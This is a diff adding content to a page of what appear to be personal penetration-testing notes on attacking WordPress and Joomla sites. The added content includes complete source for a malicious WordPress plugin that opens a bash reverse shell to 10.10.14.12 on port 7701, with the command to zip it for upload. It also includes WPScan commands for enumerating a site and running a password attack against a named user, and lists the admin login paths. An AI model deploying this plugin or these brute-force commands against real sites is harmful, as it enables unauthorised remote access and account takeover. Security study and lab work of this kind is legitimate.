@@ -103,7 +103,7 @@
     <div class="Page__header">
         <h1><a href="../Misc_Service_Attack/Misc_Services.html">Misc Service Attack</a> <svg class="Page__header--separator" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175"><path d="M360.73 229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1 0s-5.3 13.8 0 19.1l215.5 215.5-215.5 215.5c-5.3 5.3-5.3 13.8 0 19.1 2.6 2.6 6.1 4 9.5 4 3.4 0 6.9-1.3 9.5-4l225.1-225.1c5.3-5.2 5.3-13.8.1-19z"/></svg> <a href="../Misc_Service_Attack/Misc_Web_CMS.html">Misc Web CMS</a></h1>
                 <span class="ModifiedDate">
-            February 16, 2021 at 12:34 AM        </span>
+            February 16, 2021 at 12:35 AM        </span>
                         <span class="EditOn">
             <a href="https://github.com/WildfootW/Security-Note/blob/master/docs/040_Misc_Service_Attack/011_Misc_Web_CMS.md" target="_blank">
                 Edit on GitHub            </a>
@@ -111,7 +111,105 @@
             </div>
 
     <div class="s-content">
-            </div>
+        <h1 id="page_Misc_Web_Content_Management_Framework_Security">Misc Web Content Management Framework Security</h1>
+<div class="TableOfContentsContainer">
+    <h4 class="TableOfContentsContainer__title">Table of Contents</h4>
+    <div class="TableOfContentsContainer__content">
+        <ul class="TableOfContents">
+<li>
+<p><a href="#page_Misc_Web_Content_Management_Framework_Security">Misc Web Content Management Framework Security</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_tags">tags: <code>Security</code> <code>CMS</code> <code>WordPress</code> <code>Joomla</code> <code>ContentManagementFramework</code></a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_WordPress">WordPress</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Reverse_Shell">Reverse Shell</a></p>
+</li>
+<li>
+<p><a href="#page_Tools">Tools</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_WPScan">WPScan</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Joomla">Joomla</a></p>
+</li>
+</ul>    </div>
+</div>
+<h6 id="page_tags">tags: <code>Security</code> <code>CMS</code> <code>WordPress</code> <code>Joomla</code> <code>ContentManagementFramework</code></h6>
+<h1 id="page_WordPress">WordPress</h1>
+<h2 id="page_Reverse_Shell">Reverse Shell</h2>
+<ul>
+<li>WordPress Plugin
+<ul>
+<li>
+<a href="https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell" class="Link--external" rel="noopener noreferrer">WordPress Plugin : Reverse Shell</a>
+</li>
+<li>
+<code>revsh-plugin.php</code>
+</li>
+</ul>
+<pre><code>&lt;?php
+
+/**
+* Plugin Name: Reverse Shell Plugin
+* Plugin URI:
+* Description: Reverse Shell Plugin
+* Version: 1.0
+* Author: Vince Matteo
+* Author URI: http://www.sevenlayers.com
+*/
+
+exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.12/7701 0&gt;&amp;1'&quot;);
+?&gt;
+</code></pre>
+<code>zip revsh-plugin.zip revsh-plugin.php</code>
+</li>
+</ul>
+<h2 id="page_Tools">Tools</h2>
+<ul>
+<li>login page: <code>http://example.tw/wp-login.php</code>
+</li>
+</ul>
+<h3 id="page_WPScan">WPScan</h3>
+<ul>
+<li>API token
+<ul>
+<li>
+<code>--api-token XXX</code>
+</li>
+<li>
+<code>~/.wpscan/scan.yml</code>
+</li>
+</ul>
+</li>
+<li>Recon
+<pre><code>wpscan --url http://example.tw
+--enumerate [OPTS]
+</code></pre>
+</li>
+<li>Password Attack
+<pre><code>wpscan --url http://example.tw 
+--usernames &quot;william.riker&quot; 
+--passwords ./password_list
+</code></pre>
+</li>
+</ul>
+<h1 id="page_Joomla">Joomla</h1>
+<ul>
+<li>login page: <code>http://example.tw/administrator/</code>
+</li>
+</ul>
+    </div>
 
         <nav>
         <ul class="Pager">
